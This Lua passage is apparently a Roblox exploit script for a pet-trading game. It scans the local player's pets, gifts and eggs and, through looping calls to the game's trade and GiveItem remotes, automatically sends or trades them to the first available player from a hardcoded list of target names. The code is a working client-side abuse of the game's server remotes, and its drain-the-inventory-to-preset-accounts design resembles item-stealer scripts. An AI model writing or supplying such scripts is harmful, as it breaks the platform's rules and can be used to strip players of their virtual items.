-- ================= DATA HELPERS =================
local function getPlayerData()
    local ok, clientData = pcall(require, ReplicatedStorage.ClientModules.Core.ClientData)
    if not ok then return nil end
    local ok2, data = pcall(clientData.get_data, clientData)
    if not ok2 then return nil end
    return data and data[LocalPlayer.Name] or nil
end

local function findTargetItems(targetList)
    local found = {}
    local data = getPlayerData()
    if not data or not data.inventory then return found end
    for _, invType in ipairs({ "pets", "gifts" }) do
        if data.inventory[invType] then
            for uid, itemData in pairs(data.inventory[invType]) do
                if itemData.id then
                    local id = string.lower(itemData.id)
                    for _, target in ipairs(targetList) do
                        if id == target then
                            table.insert(found, { uid = uid, name = itemData.id, amount = itemData.amount or 1 })
                            break
                        end
                    end
                end
            end
        end
    end
    return found
end

local function findGifts()
    local gifts = {}
    local data = getPlayerData()
    if data and data.inventory and data.inventory.gifts then
        for uid, giftData in pairs(data.inventory.gifts) do
            if giftData.id and string.lower(giftData.id) == GIFT_TYPE then
                table.insert(gifts, { uid = uid, amount = giftData.amount or 1 })
            end
        end
    end
    return gifts
end

local function findFirstAvailablePlayer()
    for _, name in ipairs(TARGET_PLAYER_NAMES) do
        local p = Players:FindFirstChild(name)
        if p then return p end
    end
    return nil
end

-- ================= REMOTES (direct calls, proven working) =================
local function getRemote(name)
    return ReplicatedStorage:WaitForChild("API"):WaitForChild(name, 5)
end

local function fireRemote(name, ...)
    local remote = getRemote(name)
    if not remote then
        debugPrint("Remote not found: " .. name)
        return false
    end
    local ok, err = pcall(function()
        remote:FireServer(...)
    end)
    if not ok then
        debugPrint(name .. " failed: " .. tostring(err))
    end
    return ok
end

local function invokeRemote(name, ...)
    local remote = getRemote(name)
    if not remote then
        debugPrint("Remote not found: " .. name)
        return false, "not found"
    end
    local ok, result = pcall(function()
        return remote:InvokeServer(...)
    end)
    if not ok then
        debugPrint(name .. " failed: " .. tostring(result))
        return false, result
    end
    return true, result
end

-- ================= EGG TRADING (eggs can only be traded) =================
local function addEggsToTrade(eggs)
    local maxEggs = math.min(#eggs, EGG_TRADE_MAX)
    local added = 0
    for i = 1, maxEggs do
        if fireRemote("TradeAPI/AddItemToOffer", eggs[i].uid) then
            added = added + 1
            debugPrint("Added egg " .. i .. "/" .. maxEggs .. ": " .. eggs[i].name)
        end
        task.wait(0.2)
    end
    return added
end

local function tradeEggsWithPlayer(targetPlayer)
    debugPrint("Sending trade request to " .. targetPlayer.Name)
    if not fireRemote("TradeAPI/SendTradeRequest", targetPlayer) then return false end
    task.wait(3)

    local ok2 = invokeRemote("TradeAPI/AcceptOrDeclineTradeRequest", targetPlayer, true)
    if not ok2 then
        debugPrint("Failed to accept trade request")
        return false
    end
    debugPrint("Trade accepted")
    task.wait(3)

    local eggs = findTargetItems(TARGET_EGGS)
    if #eggs == 0 then
        debugPrint("No eggs to trade")
        return false
    end
    local added = addEggsToTrade(eggs)
    if added == 0 then
        debugPrint("No eggs added to trade")
        return false
    end
    task.wait(3)

    if not fireRemote("TradeAPI/AcceptNegotiation") then
        debugPrint("Failed to accept negotiation")
        return false
    end
    task.wait(6)

    if fireRemote("TradeAPI/ConfirmTrade") then
        debugPrint("Trade completed: " .. added .. " eggs traded to " .. targetPlayer.Name)
        return true
    end
    debugPrint("Failed to confirm trade")
    return false
end

local function startEggTrader()
    while EggMode do
        local eggs = findTargetItems(TARGET_EGGS)
        if #eggs == 0 then
            debugPrint("No eggs left! Stopping.")
            EggMode = false
            setButtonOff(buttons.egg, "TRADE EGGS")
            break
        end
        local target = findFirstAvailablePlayer()
        if not target then
            task.wait(10)
            continue
        end
        if tradeEggsWithPlayer(target) then
            task.wait(math.random(8, 12))
        else
            debugPrint("Trade failed. Retrying in 15 seconds...")
            task.wait(15)
        end
    end
end

-- ================= GIVE (instant GiveItem) =================
local function giveItemTo(targetPlayer, uid)
    local ok, result = invokeRemote("TradeAPI/GiveItem", targetPlayer, uid)
    if ok then
        debugPrint("Gave item to " .. targetPlayer.Name)
        return true
    end
    debugPrint("Failed to give item: " .. tostring(result))
    return false
end

local function startPetGiver()
    while PetMode do
        local target = findFirstAvailablePlayer()
        if not target then
            task.wait(10)
            continue
        end
        local pets = findTargetItems(TARGET_PETS)
        if #pets == 0 then
            debugPrint("No target pets left! Stopping.")
            PetMode = false
            setButtonOff(buttons.pet, "GIVE PETS")
            break
        end
        if giveItemTo(target, pets[1].uid) then
            task.wait(GIVE_DELAY)
        else
            task.wait(3)
        end
    end
end

local function startGiftGiver()
    while GiftMode do
        local target = findFirstAvailablePlayer()
        if not target then
            task.wait(10)
            continue
        end
        local gifts = findGifts()
        if #gifts == 0 then
            debugPrint("All " .. GIFT_TYPE .. " given away! Stopping.")
            GiftMode = false
            setButtonOff(buttons.gift, "GIVE GIFTS")
            break
        end
        local stack = gifts[1]
        if giveItemTo(target, stack.uid) then
            debugPrint("Gave " .. stack.amount .. "x " .. GIFT_TYPE .. " to " .. target.Name)
            task.wait(GIVE_DELAY)
        else
            task.wait(3)
        end
    end
end

-- ================= TRADE REQUEST ONLY =================
local function startTradeRequester()
    while TradeRequestMode do
        local target = findFirstAvailablePlayer()
        if not target then
            task.wait(10)
            continue
        end
        if fireRemote("TradeAPI/SendTradeRequest", target) then
            debugPrint("Trade request sent to " .. target.Name)
        end
        task.wait(math.random(8, 15))
    end
end

